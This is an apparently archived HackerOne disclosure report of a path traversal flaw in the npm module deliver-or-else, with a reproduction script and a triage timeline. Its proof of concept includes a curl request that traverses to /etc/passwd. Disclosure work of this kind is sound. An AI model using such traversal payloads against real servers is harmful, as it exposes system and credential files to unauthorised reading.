---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
  - vuln/path-traversal
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2020-01-29
submitted: 2019-03-10T04:49:02.886Z
bounty_usd: null
votes: 1
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "johnssimon007"
source: "https://hackerone.com/reports/507310"
title: "[deliver-or-else] Path Traversal"
---
# [deliver-or-else] Path Traversal

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 1 | **Program:** Node.js third-party modules | **Disclosed:** 2020-01-29

- Report: [https://hackerone.com/reports/507310](https://hackerone.com/reports/507310)
- CWE: Path Traversal
- Submitted: 2019-03-10T04:49:02.886Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report path traversal in deliver-or-else module
It allows an attacker to read system files via path traversal through commandline

# Module

**module name:** deliver-or-else
**version:** 1.0.0
**npm page:** https://www.npmjs.com/package/deliver-or-else

## Module Description

> Copy description from npm page

# Vulnerability

## Vulnerability Description

Directory traversal through the url which doesn't verify the file is from the root directory path.

## Steps To Reproduce:

1.npm i deliver-or-else

2.now create a node.js(test.js) file for starting up a localserver on port 80,which will serve the file on the directory(public) over the web browser depending on the file requested by user through url

here is code for test.js

const Deliver = require('deliver-or-else')
const path = require('path')
 
// It is up to you to resolve the document root directory
const http = require('http')
let deliver = new Deliver(path.join(__dirname, 'public'))
let server = http.createServer((req, res) => {
    /**
     * The `deliver` method returns a `Promise`, which in turn can be used to 
     * catch any errors (such as a 404). We could also provide a `then` clause 
     * for when it works successfully and a file has been delivered.
     */
    deliver.deliver(req, res).catch((err) => {
        // The err contains information regarding how the `fs.readFile` failed
        
        res.statusCode = 404
        res.setHeader('Content-Type', 'text/plain')
        res.end('404, no such file.')
    })
})
 
server.listen(80, '127.0.0.1', function () {
    console.log('Starting server...')
})

3.run below command
node test.js
this will startup the server at port 80 

4.trying to fetch a file outside of "public" dir is exempted and shows 404 error

5.this can be bypassed by using curl via commandline by running below command
curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/passwd

which will return the passwd directory contents


# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

> Hunter's comments and funny memes goes here

## Impact

This vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.

## Timeline

- **Report Filed**
- **2019-03-10** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **2019-03-13** @ronperris: Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as a vulnerability.

I will invite the package maintainer to this issue.
- **Report Triaged**
- **Report Title Updated**
- **2019-05-03** @johnssimon007: Theres seems to be no response from package manager @ronperris .what should we do now?
- **2019-09-30** @johnssimon007: @ronperris there seems to be no update on this report ?.. since there's no response from package maintainer could you please close this as resolved and I will raise the issue in the repository
- **2019-12-30** @johnssimon007: @ronperris can we just close this as resolved,since it's been a long time.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
